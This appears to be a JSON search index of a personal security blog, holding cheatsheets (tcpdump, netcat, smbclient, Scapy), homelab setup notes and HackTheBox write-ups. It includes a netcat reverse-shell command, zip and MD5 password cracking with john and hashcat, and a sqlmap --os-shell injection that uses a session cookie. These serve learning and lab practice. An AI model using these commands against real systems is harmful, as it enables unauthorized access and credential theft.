[ { "title": "Quantum computers", "url": "/posts/Quantum-Computers/", "categories": "Notes, Quantum Computers", "tags": "Quantum_Computer", "date": "2022-11-27 00:00:00 +0100", "snippet": "Index Theoretical Bases Advantages / Disadvantages Encryption Real Examples Future ForecastTheoretical BasisCurrently computers works with bits. These are 1’s and 0’s that are formed depending on whether the transistors allow electricity to pass through. All these transistors together make up today’s computers, mobile phones… A quantum system, by superposition, can be in two states at the same time.Current system --&gt; 1 or 0Quantum system --&gt; 1 and 0A normal transistor can do 1 operation at a time, while a quantum transistor, if its state is not determined, can do 4 operations at a time. This is one of the problems encountered in the quantum world, maintaining this overlap is a very high cost.Coin in the hand --&gt; Heads or TailsCoin in the air --&gt; Heads and Tails. #QuBits #bits #bits RAM 1 2 2 bits   3 8 1 Byte   33 8589934592 1 GByte   43 8.8x10^12 1 TByte   Advantages and DisadvantagesAdvantages Faster computing: 1000 times faster than current supercomputers. Improved simulation: Being faster, more cases can be simulated. Improved privacy: By having a quantum cryptography, it is impossible to breach. China has said that it is impossible to hack. Improved AI and Machine Learning.Disadvantages New algorithms: Current algorithms do not work and are very weak in a quantum world. The low temperature they need to work (-200 °C). It is not open to the public, and they are still in a very early stage, 10 QuBits. Internet security.Quantum EncryptionQKD (Quantum Key Distribution).Photons: Smallest unit of energy in a light wave that cannot be divided.Polarization: property of waves that allows them to oscillate in more than one orientation. When a photo is observed, it alters and is determined in only one direction.Alice sends polarized photons in 4 different directions randomly. Bob has 2 detectors to know how to interpret the directions that arrive to him. He does this randomly (this gives him a 50% chance). When Bob has just read the message sent by Alice, she tells him what random chain of detectors she has used to detect the photons. Alice compares Bob’s sequence with his initial sequence and tells him when he has used the detector incorrectly. In this way Bob knows which are the photons registered correctly (the ones he has made wrongly he does not use them). The correct result will be the quantum key that will be used by both parties to encrypt and decrypt the information.Why is it so secure?If an attacker tries to listen to the string of photons that Alice sends to Bob, by observing these photons, he disrupts the quantum state by defining a state. As a result, the message that arrives to Alice is not the one she sent.When Bob finishes reading the whole string, he sends a part of it to Alice to check. If she detects that there are many errors or inconsistencies, she will raise the alarm, saying that there is something altering the message.This procedure is repeated every few seconds for greater security.Note: Quantum teleportation is being investigated to transport these keys.Current problemsThe biggest problem with quantum computers is how easy it is to crack current encryption systems. To take an example and be able to quantify it, we will take the 2048-bit RSA protocol.At the present time, a normal computer would take 300 trillion years to decrypt the key. While a quantum computer with, 4099 QuBits would take 10 seconds.Note: The quantum computer with the most QuBits is 127 (Eagle IBM).Future ForecastCurrently, quantum computers are only a reality for those who have a lot of resources and capital. Among the most developed countries, the following stand out: The United States: With companies such as IBM, Google, Intel… Also the US government itself has one. China: This country is a bit of a mystery, but the last known news is that they sent an encrypted message to a distance of 1120 km. Next countries: These are the countries that have shown great interest in this new technology and how much capital they will allocate: Australia: 2500 M $ (Silicon Quantum Computing). Germany: 2000 M € (QSolid). France: 1800 M € (France Quantum). Spain: 60 M € (Quantum Spain). " }, { "title": "tcpdump", "url": "/posts/tcpdump/", "categories": "Cheatsheet, Network", "tags": "tcpdump", "date": "2022-10-18 00:00:00 +0200", "snippet": "tcpdumpPacket analyzer that is launched from the command line. It can be used to analyze network traffic by intercepting and displaying packets that are being created or received by the computer it’s running on. It runs on Linux and most UNIX-type operating systems.TCP Flags SYN: The synchronisation flag is used as a first step inestablishing a three way handshake between two hosts. Only the firstpacket from both the sender and receiver should have this flag set.The following diagram illustrates a three way handshake process. ACK: The acknowledgment flag is used to acknowledge the successful receipt of a packet. As we can see from the diagram above, the receiver sends an ACK as well as a SYN in the second step of the three way handshake process to tell the sender that it received its initial packet. FIN: The finished flag means there is no more data from the sender. Therefore, it is used in the last packet sent from the sender. URG: The urgent flag is used to notify the receiver to process the urgent packets before processing all other packets. The receiver will be notified when all known urgent data has been received. See RFC 6093 for more details. PSH: The push flag is somewhat similar to the URG flag and tells the receiver to process these packets as they are received instead of buffering them. RST: The reset flag gets sent from the receiver to the sender when a packet is sent to a particular host that was not expecting it. ECE: This flag is responsible for indicating if the TCP peer is ECN capable. See RFC 3168 for more details. CWR: The congestion window reduced flag is used by the sending host to indicate it received a packet with the ECE flag set. See RFC 3168 for more details. NS (experimental): The nonce sum flag is still an experimental flag used to help protect against accidental malicious concealment of packets from the sender. See RFC 3540 for more details. CheatsheetTCPDUMP FLAGSURG = (Not Displayed in Flag Field, Displayed elsewhere) ACK = (Not Displayed in Flag Field, Displayed elsewhere)PSH = [P] (Push Data)RST = [R] (Reset Connection)SYN = [S] (Start Connection)FIN = [F] (Finish Connection)SYN-ACK = [S.] (SynAcK Packet) [.] (ACK is set) Basic communication // see the basics without many options tcpdump -nS Basic communication (very verbose) // see a good amount of traffic, with verbosity and no name help tcpdump -nnvvS A deeper look at the traffic // adds -X for payload but doesn’t grab any more of the packet tcpdump -nnvvXS Heavy packet viewing // the final “s” increases the snaplength, grabbing the whole packet tcpdump -nnvvXSs 1514 host // look for traffic based on IP address (also works with hostname if you’re not using -n) tcpdump host 1.2.3.4 src, dst // find traffic from only a source or destination (eliminates one side of a host conversation) tcpdump src 2.3.4.5tcpdump dst 3.4.5.6 net // capture an entire network using CIDR notation tcpdump net 1.2.3.0/24 proto // works for tcp, udp, and icmp. Note that you don’t have to type proto tcpdump icmp port // see only traffic to or from a certain port tcpdump port 3389 src, dst port // filter based on the source or destination port tcpdump src port 1025tcpdump dst port 389 src/dst, port, protocol // combine all three tcpdump src port 1025 and tcptcpdump udp and src port 53 Port Ranges // see traffic to any port in a range tcpdump portrange 21-23 Packet Size Filter // only see packets below or above a certain size (in bytes) tcpdump less 32tcpdump greater 128 Packet Size Filter using symbols tcpdump &gt; 32tcpdump &lt;= 128Note: Only the PSH, RST, SYN, and FIN flags are displayed in tcpdump‘s flag field output. URGs and ACKs are displayed, but they are shown elsewhere in the output rather than in the flags field. Keep in mind the reasons these filters work. The filters above find these various packets because tcp[13] looks at offset 13 in the TCP header, the number represents the location within the byte, and the !=0 means that the flag in question is set to 1, i.e. it’s on. Show all URG packets: tcpdump 'tcp[13] &amp; 32 != 0' Show all ACK packets: tcpdump 'tcp[13] &amp; 16 != 0' Show all PSH packets: tcpdump 'tcp[13] &amp; 8 != 0' Show all RST packets: tcpdump 'tcp[13] &amp; 4 != 0' Show all SYN packets: tcpdump 'tcp[13] &amp; 2 != 0' Show all FIN packets: tcpdump 'tcp[13] &amp; 1 != 0' Show all SYN-ACK packets: tcpdump 'tcp[13] = 18' Show icmp echo request and reply tcpdump -n icmp and 'icmp[0] != 8 and icmp[0] != 0' Show all IP packets with a non-zero TOS field (one byte TOS field is at offset 1 in IP header): tcpdump -v -n ip and ip[1]!=0 Show all IP packets with TTL less than some value (on byte TTL field is at offset 8 in IP header): tcpdump -v ip and 'ip[8]&lt;2' Show TCP SYN packets: tcpdump -n tcp and port 80 and 'tcp[tcpflags] &amp; tcp-syn == tcp-syn'tcpdump tcp and port 80 and 'tcp[tcpflags] == tcp-syn'tcpdump -i &lt;interface&gt; \"tcp[tcpflags] &amp; (tcp-syn) != 0\" Show TCP ACK packets: tcpdump -i &lt;interface&gt; \"tcp[tcpflags] &amp; (tcp-ack) != 0\" Show TCP SYN/ACK packets (typically, responses from servers): tcpdump -n tcp and 'tcp[tcpflags] &amp; (tcp-syn|tcp-ack) == (tcp-syn|tcp-ack)'tcpdump -n tcp and 'tcp[tcpflags] &amp; tcp-syn == tcp-syn' and 'tcp[tcpflags] &amp; tcp-ack == tcp-ack'tcpdump -i &lt;interface&gt; \"tcp[tcpflags] &amp; (tcp-syn|tcp-ack) != 0\" Show TCP FIN packets: tcpdump -i &lt;interface&gt; \"tcp[tcpflags] &amp; (tcp-fin) != 0\" Show ARP Packets with MAC address tcpdump -vv -e -nn ether proto 0x0806 Show packets of a specified length (IP packet length (16 bits) is located at offset 2 in IP header): tcpdump -l icmp and '(ip[2:2]&gt;50)' -w - |tcpdump -r - -v ip and '(ip[2:2]&lt;60)'" }, { "title": "Spiderfoot", "url": "/posts/Spiderfoot/", "categories": "Cheatsheet, OSINT", "tags": "Spiderfoot", "date": "2022-10-18 00:00:00 +0200", "snippet": "SpiderfootOpen source intelligence (OSINT) automation tool. It integrates with just about every data source available and utilises a range of methods for data analysis, making that data easy to navigate.InstallationSpiderFoot has an embedded web-server for providing a clean and intuitive web-based interface but can also be used completely via the command-line. It’s written in Python 3 and MIT-licensed. It also can be deployed using Docker file.wget https://github.com/smicallef/spiderfoot/archive/v4.0.tar.gztar zxvf v4.0.tar.gzcd spiderfoot-4.0sudo apt install -y python3 pippip3 install -r requirements.txtpython3 sf.py -l 127.0.0.1:5001How it worksFirst you need to navigate to “New Scan”, enter the target, and select the mode. Spiderfoot has 4 main modes: All: All SpiderFoot modules will be enabled (slow) but every possible piece of information about the target will be obtained and analysed. Footprint: Gain an understanding about the target’s network perimeter, associated identities and other information that is obtained through a lot of web crawling and search engine use. Investigate: Some basic footprinting will be performed in addition to querying of blacklists and other sources that may have information about your target’s maliciousness. Passive:As much information will be gathered without touching the target or their affiliates, therefore only modules that do not touch the target will be enabled.You can also specify only the modules you want to use. For example, if you only want information about affiliates, just select those options:ResultHere you can see a graph that shows, with which modules it has obtained more information from the target. Since we have specified a web page, most of the information has to do with the content of the web page and the HTTP Headers.ExtraIt has more than 200 modules that are used to search the internet for possible target information. The target can be: IP address Domain/sub-domain name Hostname Network subnet (CIDR) ASN E-mail address Phone number Username Person’s name Bitcoin address" }, { "title": "homeLab Project Documentation", "url": "/posts/HomeLab_Project/", "categories": "HomeLab", "tags": "docker, raspberry_pi", "date": "2022-08-27 00:00:00 +0200", "snippet": "homeLab Project DocumentationThis is my documentation for the “homeLab” project. Here you will be able to configure your Raspberry Pi to be a server of very useful services in the day to day like for example: Samba, Bitwarden…If there is any doubt or error in the documentation, do not hesitate to contact me: InstagramTable of Contents Initial Configuration PiVPN AdGuard Home Docker + Portainer Cloudflare DDNS NGINX Reverse Proxy Vaultwarden Samba Dashy Further Investigations SourcesInitial configurationSince these steps are fairly simple, I will give a short summary of my process before installing anything: Install O.S. to the Raspberry Pi. Execute my Post Installation Script Assign static IP address to the Raspberry in your Router.Install and Configure PiVPNPiVPN is a free and open-source software suite that sets up a VPN server using OpenVPN server software. It has been designed specifically to run on a low-cost Raspberry Pi.1.. Now executhe the following commands:# Update the systemsudo apt update -y &amp;&amp; sudo apt upgrade -y# Install PiVPNcurl -L https://install.pivpn.io | bash2.. Create a new user and copy the file to the device we want to use it. You can use WinSCP to copy files.# Create usersudo pivpn -a# Change permissions to the directorysudo chown -R pi:pi ~/configs3.. To make this work, we need to create a new Port Forwading rule in our Router:Install and Configure AdGuard HomeAdGuard Home is a network-wide software for blocking ads &amp; tracking. After you set it up, it’ll cover ALL your home devices, and you don’t need any client-side software for that.It operates as a DNS server that re-routes tracking domains to a “black hole”, thus preventing your devices from connecting to those servers. It’s based on software we use for our public AdGuard DNS servers, and both share a lot of code.1.. Execute the following command to install AdGuard Home:curl -s -S -L https://raw.githubusercontent.com/AdguardTeam/AdGuardHome/master/scripts/install.sh | sh -s -- -v2.. Navigate to AdGuard Home Administrator Dashboard and finish the setup. (IP:3000)3.. Now it’s time to configure AdGuard Home. First, we will setup our device and test that AdGuard is working properly.To configure your device, navigate to “Setup Guide” in the Header.4.. Once we have checked that, at least, one device is working properly, we will add more blocklists to the filter. Navigate to: Filters &gt; DNS Blocklists &gt; Add Blocklists &gt; Choose from the list.5.. Select all the options and click Save. If you want more domains, you can visit this web and copy those URLs into your Blocklists filter.Install and Configure Docker &amp; PortainerMost of this project is based on a program called Docker, so the first step will be to install it along with Portainer in order to manage it.Docker packages software into standardized units called containers that include everything needed for the software to run, including libraries, system tools, code and runtime. More information link.1.. Execute the following commands:# Update the systemsudo apt update -y &amp;&amp; sudo apt upgrade -y# Install Dockercurl -sSL https://get.docker.com | sh# Enable Dockersudo systemctl enable --now docker# Give user permissions to Docker (pi=my username)sudo usermod -aG docker pi# Install Portainersudo docker run -d -p 9000:9000 -p 9443:9443 --name=portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer-ce:latest2.. Once installed, open your web browser and navigate to the Protainer Dashboard. To do that, you will need to write down the IP:Port. In out case, port is mapped to 9000.3.. Before installing anything else, let’s change the templates shown in “App Templates”.To do that, you will need to change the URL to https://raw.githubusercontent.com/pi-hosted/pi-hosted/master/template/portainer-v2-arm64.json4.. Finally, let’s configure the IP to which the shortcuts will open to point to the raspberry pi (192.168.1.81) and not to its local one (127.0.0.1).Navigate to Environment &gt; local. In Public IP, write down Raspberry Pi IP.Install and Configure Cloudfare DDNSDynamic DNS (DDNS) is a service that keeps the DNS updated with a web property’s correct IP address, even if that IP address is constantly being updated. More information Link1.. Open Cloudfare dashboard and create a new API Token. Link2.. Create a new Token &gt; Create Custom Token.3.. From the Templates list, select Cloudfare DDNS and configure it:4.. Finally, check in Cloudfare that we can see our “local” entry pointing to our Public IP. We must change the option to DNS Only because we will use NGINX in the future.Install and Configure NGINX Reverse ProxyThe Nginx proxy manager (NPM) is a reverse proxy management system running on Docker. NPM is based on an Nginx server and provides users with a clean, efficient, and beautiful web interface for easier management. The tool is easy to set up and does not require users to know how to work with Nginx servers or SSL certificates. More information Link1.. Create the directory and a yaml file inside with this content:version: '3'services: app: image: 'jc21/nginx-proxy-manager:latest' restart: unless-stopped ports: - '80:80' - '81:81' - '443:443' volumes: - ./data:/data - ./letsencrypt:/etc/letsencrypt2.. After creating this file, bring up the stack.sudo docker-compose up -d3.. Login into Admin UI (IP:81) and end the configuration.Email: admin@example.comPassword: changemeInstall and Configure VaultwardenBitwarden is a free and open-source password management service that stores sensitive information such as website credentials in an encrypted vault. The Bitwarden platform offers a variety of client applications including a web interface, desktop applications, browser extensions, mobile apps, and a command-line interface. More information Link0.. Create 2 Forwarding rules in your router (HTTP &amp; HTTPS).1.. Create the directory and a yaml file inside with this content:version: '3'services: vaultwarden: restart: unless-stopped container_name: vaultwarden image: vaultwarden/server:latest volumes: - ./vw-data/:/data/ ports: - 8062:80 environment: - LOGIN_RATELIMIT_MAX_BURST=10 - LOGIN_RATELIMIT_SECONDS=60 - DOMAIN=https://pass.impulsado.org # CHANGE THIS - ADMIN_TOKEN=P@ssword # CHANGE THIS - SIGNUPS_ALLOWED=false - SIGNUPS_DOMAINS_WHITELIST=example.com # CHANGE THIS - SIGNUPS_VERIFY=true - SIGNUPS_VERIFY_RESEND_TIME=3600 - SIGNUPS_VERIFY_RESEND_LIMIT=6 - EMERGENCY_ACCESS_ALLOWED=true - SENDS_ALLOWED=true - WEB_VAULT_ENABLED=true2.. After installing it, access to portainer and add the Vaultwarden container to the NGINX network.3.. Now access to NGINX dashboard and create a new Certificate to the Vaultwarden container. Navigate to: SSL certificate &gt; “Add SSL certificate”4.. Now add a new “Proxy Host”.5.. Finally, access to the website and create an account. Remember that the email domain must be one of the previously authorized ones. (e.g. example.com = mail@example.com).6.. If you want to configure Vaultwarden more extensively, you can go to “pass.domain.com/admin”.Install and Configure SambaSamba is an open-source software suite that runs on Unix/Linux based platforms but is able to communicate with Windows clients like a native application. So Samba is able to provide this service by employing the Common Internet File System (CIFS). More information Link1.. Mount the external storage.# List all disks and search for the onw you want to mount.sudo fdisk -l# Create the folder where the disk will be mounted.sudo mkdir /mnt/&lt;name-of-the-drive&gt;# Edit /etc/fstabUUID=&lt;uuid-of-your-drive&gt; &lt;mount-point&gt; &lt;file-system-type&gt; &lt;mount-option&gt; &lt;dump&gt; &lt;pass&gt;## EXAMPLEUUID=0792EAD8-DE83-4D3B-A031-DE16CF8AF399 /mnt/sda1 ext4 defaults 0 1# Save the config and close the file.sudo mount -a2.. Open Portainer and search for Samba template.3.. Configure Samba template like this:4.. Wait a little bit and try to connect to Samba:Install and Configure DashyA self-hostable personal dashboard built for you. Includes status-checking, widgets, themes, icon packs, a UI editor. More information Link1.. Create the folder where you will creat the configuration file and create the conf.yml.---pageInfo: title: Hello, impulsado description: Dashboard logo: https://avatars.githubusercontent.com/u/72570835?v=4appConfig: statusCheck: false theme: dashy-docs fontAwesomeKey: c94dc2b452 customCss: '.clock p.time { font-size: 3rem !important; }' layout: vertical iconSize: medium language: essections: - name: Today icon: far fa-smile-beam displayData: collapsed: false hideForGuests: false widgets: - type: clock id: 0_513_clock - name: Selfhosted icon: far fa-code items: - title: AdGuard icon: si-adguard url: http://192.168.1.81:3000/ - title: Nginx Reverse Proxy icon: si-nginx url: http://192.168.1.81:81/ - title: Portainer icon: si-portainer url: http://192.168.1.81:9000/ - title: Vaultwarden icon: si-bitwarden url: https://pass.impulsado.org - title: Cloudflare icon: si-cloudflare url: https://www.cloudflare.com/ - title: wannaNotes icon: si-github url: https://www.notes.impulsado.org/ - title: Router icon: si-pfsense url: http://192.168.1.1/homeAuthentication.html---2.. Go to Portainer and create a new stack.---version: \"2.1\"services: dashy: image: lissy93/dashy container_name: Dashy volumes: - /home/pi/Programs/Dashy/conf.yml:/app/public/conf.yml ports: - 4000:80 environment: - NODE_ENV=production - UID=1001 - GID=100 restart: unless-stopped3.. Now you can access to the Dashboard (IP:4000)Further Investigations SSL Certificates Backups Manage Logs Fail2BanSources Pi-Hosted Project: https://github.com/novaspirit/pi-hosted Self-Hosted Docker setups: https://github.com/abhilesh/self-hosted_docker_setups Selfhosted Reddit: https://www.reddit.com/r/selfhosted/" }, { "title": "tmux", "url": "/posts/tmux/", "categories": "Cheatsheet, Personal", "tags": "tmux", "date": "2022-08-20 00:00:00 +0200", "snippet": "tmuxAllows multiple terminal sessions to be accessed simultaneously in a single window.More information Link Start tmux $ tmux new -s NAME Kill Session $ tmux kill-session -t NAME List All Sessions $ tmux ls CheatsheetLinkOh-My-TmuxA better option is to install Oh-My-Tmux.Download LinkConfigure Link! Install xclipShortcuts|Shortcut | Function || — | — || c | Create Window || Enter | Copy-Mode || - | Split Horizontal || _ | Split Veritcal || J or K | Resize Window (Up/Down) || H or L | Resize Window (Right/Left) || , | Change Window Name || &amp; | Kill Window|| m | Mouse Mode |" }, { "title": "smbclient", "url": "/posts/smbclient/", "categories": "Cheatsheet, Common", "tags": "SAMBA, smb", "date": "2022-08-20 00:00:00 +0200", "snippet": "smbclientTool used to connect to Samba servers - Samba is a Windows-based filesharing protocol.Basic Syntax Connect to Server $ smbclient //@Target_IP Connect to specific share $ smbclient //@Target_IP/Share Check Samba Resources $ smbclient -N -L @Target_IP Download File $ smbclient '//@Target_IP/SHARE' -c 'lcd DOWNLOAD_PATH; cd DIRECTORY; get FILENAME' Upload File $ smbclient '//@Target_IP/SHARE' -c 'cd REMOTE_PATH; lcd LOCAL_DIRECTORY; put LOCAL_FILENAME' Mount Share```bash$ sudo mkdir /mnt/SHARE$ sudo apt install cifs-utils$ sudo mount -t cifs //@Target_IP/SHARE /mnt/SHARE## Commands&gt; Download```bashsmb: \\&gt; get FILE Upload smb: \\&gt; put FILE Navigate smb: \\&gt; dir Change Directory Locally smb: \\&gt; lcd LOCAL_DIRECTORY_PATH " }, { "title": "responder.py Daemon", "url": "/posts/responder.py_Daemon/", "categories": "Troubleshooting", "tags": "responder", "date": "2022-08-20 00:00:00 +0200", "snippet": "setDaemon DeprecatedIn the python 3.10 version there is an error and it does not work correctly.setDaemon has been deprecated in favor of setting daemon attribute directly.To solve it, it is necessary to change the code.Solution found in: Link From .setDaemon(True) To .daemon = True " }, { "title": "netcat", "url": "/posts/netcat/", "categories": "Cheatsheet, Common", "tags": "netcat", "date": "2022-08-20 00:00:00 +0200", "snippet": "netcatNetcat is a tool that reads and writes data across network connections, using TCP or UDP protocol. More information LinkServer ModeUse netcat to listen for connections. What this does is open a port (either tcp or udp) on the system. By default netcat listens on tcp. Basic Listener $ nc -lvnp PORT To listen on UDP must use -u.Client ModeUse netcat to connect to an open port on a system. This can be beneficial for manually checking service banners or just checking if the port is open. Basic Connection $ nc -vn @IP PORT For a UDP connection we only add the -u option.File TransferTransfer files over the connection from one system to another without distortion. Listener nc -lp PORT &gt; /path/to/outfile Client $ nc -w3 @Listener_IP PORT &lt; /path/to/infile Reverse ShellUse netcat in server mode to listen for connections then supply the shell from the client. This will allow the session on the server to run commands on the client once the shell is received. Server (Attacker Machine) $ nc -lvnp 8080 Client (Victim Machine) $ nc -e /bin/bash @Server_IP PORT " }, { "title": "iptables vs nftables", "url": "/posts/iptables_vs_nftables/", "categories": "cybersecAnalyst, Firewall", "tags": "iptables, nftables", "date": "2022-08-20 00:00:00 +0200", "snippet": "iptables vs nftablesiptablesIPtables is a command line utility that is used for configuring firewall rules, usually in combination with a frontend. IPtables is able to inspect, modify or drop network packets. The “tables” consist of “chains” which contain “rules” that are processed in the defined order.Rules are basically conditions that have to be true respectively to match a defined action to be executed. All incoming packets, regardless the source (internal/internet), are being processed by the very same rules.Tables: raw filter (important) NAT (important) mangle securitynftablesNftables (developed by netfilter/IPtables) is a package filtering framework. It was basically built to replace the old IPtables, because IPtables had several problems in terms of performance and scalability.Note: Available in Linux Kernel since version 3.13Difference with iptables ntables uses a new syntax Tables and chains are fully configurable: iptables has multiple pre-defined tables and base chains, all of which are registered even if you only need one of them. With nftables there are no pre-defined tables or chains. Each table is explicitly defined, and contains only the objects (chains, sets, maps, flowtables and stateful objects) that you explicitly add to it. A singles nftables rule can take multiple actions: Each statement takes an action, such as setting the netfilter mark, counting the packet, logging the packet, or rendering a verdict such as accepting or dropping the packet or jumping to another chain. As with expressions, multiple statements are linearly evaluated from left to right: a single rule can take multiple actions by using multiple statements. No built-in counter per chain and rule: In nftables counters are optional, you can enable them as needed. Better support for dynamic ruleset updates: Adding or deleting a rule leaves the rest of the ruleset untouched, simplifying maintenance of internal state information. Simplified dual stack IPv4/IPv6 administration: The nftables inet family allows you to register base chains that see both IPv4 and IPv6 traffic. It is no longer necessary to rely on scripts to duplicate your ruleset. Support new protocols without a kernel upgrade: With the new nftables virtual machine approach, supporting a new protocol will often not require a new kernel, just a relatively simple nft userspace software update. " }, { "title": "WireGuard vs OpenVPN", "url": "/posts/Wireguard_vs_OpenVPN/", "categories": "cybersecAnalyst, VPN", "tags": "WireGuard, OpenVPN", "date": "2022-08-20 00:00:00 +0200", "snippet": "WireGuard vs OpenVPNSpeed TestIn the official WireGuard page, there is a Benchmark between WireGuard, IPsec and OpenVPN. In terms of throughput, WireGuard wins with a difference of 753 mbps over OpenVPN. But it only beats IPsec by 130 mbps.There is also a second test that checks the response time of a ping. WireGuard is again the best performer, with a difference of 0.1ms compared to IPsec and 1.1ms compared to OpenVPN.EncryptionOpenVPN uses the OpenSSL library to provide encryption. OpenSSL supports the following cryptographic algorithms: AES, Blowfish, Camellia, ChaCha20, Poly1305, DES, Triple DES, GOST 28147-89, SM4 and more for encryption and authentication. MD5, MD4, SHA-1, SHA-2, MDC-2, BLAKE2, and more for hashing. RSA, DSA, X25519, Ed25519, SM2 and more for key derivation and agreement. UDP or TCP as the Transport Layer protocol. Perfect Forward Secrecy to protect user data.This number of algorithms allows OpenVPN to be more flexible. The code can negotiate the use of different algorithms depending on the circumstances. On the other hand, this complexity of the code slows down performance.The operation of WireGuard encryption algorithms is different. WireGuard uses a fixed set of algorithms: ChaCha20 for symmetric encryption. Poly1305 for authentication using RFC7539’s AEAD construction. Curve25519 for Elliptic-curve Diffie–Hellman (ECDH) anonymous key agreement. BLAKE2s for hashing (RFC7693) SipHash24 for hashtable keys. HKDF for key derivation (RFC5869). UDP as the Transport Layer protocol. Perfect Forward Secrecy (PFS) to protect user data.OpenVPN uses certificates for identification and encryption, while WireGuard uses a public key for these tasks. Although, WireGuard allows you to create an additional pre-shared key to add another layer of security.Depending on the needs, in the aspect of the encryption, both have advantages and disadvantages. OpenVPN can operate using several protocols, but at the same time broadens the attack surface.WireGuard only uses one set of protocols and this leads to a lighter, smaller attack area. On the downside, if a vulnerability is found, you will have to upgrade to a newer version.AuditabilityBoth programs are code, but OpenVPN has hundreds of thousands of lines, while WireGuard has only 4000.PrivacyVPN protocols provide security, not privacy. What determines privacy are the policies of the VPN service, in particular whether it stores logs.OpenVPN’s design does not need to store any user information on the VPN server, so it does not compromise user privacy.The main problem with the WireGuard VPN is that it stores the user’s IP on the VPN server. WireGuard maps the public keys with the allowed IPs, simplifying some aspects, but making the user’s IP stored in the VPN server until is rebooted.Saving the IP on the server in this way would make WireGuard no longer be considered “no-logs” VPN. " }, { "title": "00 - Vaccine", "url": "/posts/Vaccine_00/", "categories": "Writeups, HTB, Very_Easy, Vaccine", "tags": "ftp, SQL, SUID", "date": "2022-08-20 00:00:00 +0200", "snippet": "Intro| Dificulty | OS | Start Date | End Date ||—|—|—|—|| Very Easy | Linux | 11/06/2022 | 12/06/2022 |Process Login as anonymous on ftp service &gt; get the .zip and unzip. Use John The Reapper to unzip the file.John The ReapperThere is a script call it zip2john that creates a hash out of a zip file. After, with this hash, we run a wordlist to brute force the password. Get the hash $ zip2john backup.zip &gt; hash.txt Brute Force the hash $ john -wordlist=/usr/share/wordlists/rockyou.txt hash.txt Show the password $ john --show hash.txt Must `gunzip rockyou.txt.gz`MD5 PasswordInside index.php there was admin’s password encrypted using MD5. To crack MD5 password execute this command:$ sudo hashcat -m 0 pass.md5 /usr/share/wordlists/rockyou.txtSQL InjectionIn the website there is a search bar that we can explote with SQL injection.We can use sqlmap but before executing any command, we will need to grab the cookie to authenticat admin user. [//]: Install cooki-editor extension$ sqlmap -u http://10.129.95.174/dashboard.php?search=hello --cookie=\"PHPSESSID=rp7ki2fucgrc0brl7f1l9j5p9e\" --os-shellUser flag is in /var/lib/postgresql/I found users flag but I lost in the proccess of creating a interactive shell.I only need root flag." }, { "title": "00 - Sequel", "url": "/posts/Sequel_00/", "categories": "Writeups, HTB, Very_Easy, Sequel", "tags": "SQL, MariaDB", "date": "2022-08-20 00:00:00 +0200", "snippet": "Intro| Dificulty | OS | Start Date | End Date ||—|—|—|—|| Very Easy | Linux | 17/05/2022 | 17/05/2022 |Thought process View running services with nmap. LogIn to MariaDB using root (Doesn’t need password) Show databases and use one. Select content of the tables.ResolutionAfter seeing that the machine had a MariaDB server, I tried to login as root (by default it has no password). LogIn to MariaDB $ mysql -h @IP -u root I listed the Databases and Selected the one call it “htb” Show Databases and Use it SHOW databases; /* */ USE dName; Once inside a Database I listed the Tables and made a simple SELECT. Show Tables and Simple Select SHOW tables; /**/ SELECT * FROM tNAME; " }, { "title": "Security Headers", "url": "/posts/Security_Headers/", "categories": "Notes, Web_Security", "tags": "Security_Headers", "date": "2022-08-20 00:00:00 +0200", "snippet": "Security HeadersSecurity headers are directives used by web applications to configure security defenses in web browsers. Based on these directives, browsers can make it harder to exploit client-side vulnerabilities such as Cross-Site Scripting or Clickjacking. Headers can also be used to configure the browser to only allow valid TLS communication and enforce valid certificates, or even enforce using a specific server certificate.HTTP Strict Transport Security (HSTS)HTTP Strict Transport Security is a header that configures the web browser to always use a valid secure connection with the web application. If the server TLS certificate suddenly becomes expired or untrusted, the browser will no longer connect to the web application. Also, if the user attempts to access the web application using an http:// url, the browser will automatically change it to https://. These countermeasures help prevent Man-in-the-middle attacks as well as other attacks such as Session Hijacking.Content Security Policy (CSP)Content-Security-Policy is the name of a HTTP response header that modern browsers use to enhance the security of the document (or web page). The Content-Security-Policy header allows you to restrict how resources such as JavaScript, CSS, or pretty much anything that the browser loads. Prevent client-side attacks, such as Cross-Site Scripting and Clickjacking, by restricting the type of content the browser is allowed to include or execute.Permission PolicyPermissions Policy Header is an added layer of security that helps to restrict from unauthorized access or usage of browser/client features by web resources. This policy ensures the user privacy by limiting or specifying the features of the browsers can be used by the web resources. Permissions Policy provides a set of standard HTTP headers that allow website owners to limit which features of browsers can be used by the page such as camera, microphone, location, full screen etc." }, { "title": "Scapy", "url": "/posts/Scapy/", "categories": "Cheatsheet, Network", "tags": "Scapy", "date": "2022-08-20 00:00:00 +0200", "snippet": "ScapyForge or decode packets of a wide number of protocols, send them on the wire, capture them, match requests and replies, and much more.Basics List supported layers ls() Some key layers are:ether, arp, ip, ipv6, tcp, udp, icmp Layer Fields ls(TCP) Some key commands for interacting with packets:rdpcap, send, sr, sniff, wrpcap Help help(rdpcap) Layer 2ls(Ehter)| Field | Type | Default Value || — | — | —| | dst : | DestMACField | = (None) | | src : | SourceMACField | = (None) | | type : | XShortEnumField | = (0) |Layer 3ls(IP)| Field | Type | Default Value | | — | — | — || version : | BitField | = (4) || ihl : | BitField | = (None) || tos : | XByteField | = (0) || len : | ShortField | = (None) || id : | ShortField | = (1) || flags : | FlagsField | = (0) || frag : | BitField | = (0) || ttl : | ByteField | = (64) || proto : | ByteEnumField | = (0) || chksum : | XShortField | = (None) || src : | Emph | = (None) || dst : | Emph | = (‘127.0.0.1’) || options : | PacketListField | = ([]) |Layer 4ls(TCP)| Field | Type | Default Value || — | — | — || sport : | ShortEnumField | = (20) || dport : | ShortEnumField | = (80) | | seq : | IntField | = (0) || ack : | IntField | = (0) || dataofs : | BitField | = (None) || reserved : | BitField | = (0) || flags : | FlagsField | = (2) || window : | ShortField | = (8192) || chksum : | XShortField | = (None) || urgptr : | ShortField | = (0) || options : | TCPOptionsField | = ({}) |Basic Packet CraftingScapy works with layers. Layers are individual functions linked together with the “/” character to construct packets. Simple Packet```python Layer2=Ether(dst=”08:00:27:d4:8f:54”)Layer3=IP(src=”192.168.0.1”,dst=”192.168.0.1”)packet=(Layer2/Layer3/”Payload”)packet.show()###[ Ethernet ]### dst= 08:00:27:d4:8f:54 src= 08:00:27:b8:90:cf type= IPv4###[ IP ]### version= 4 ihl= None tos= 0x0 len= None id= 1 flags= frag= 0 ttl= 64 proto= hopopt chksum= None src= 192.168.0.1 dst= 192.168.0.1 \\options###[ Raw ]### load= ‘Payload’ send=sendp(packet, iface=”enp0s3”)```[sendp]: Send 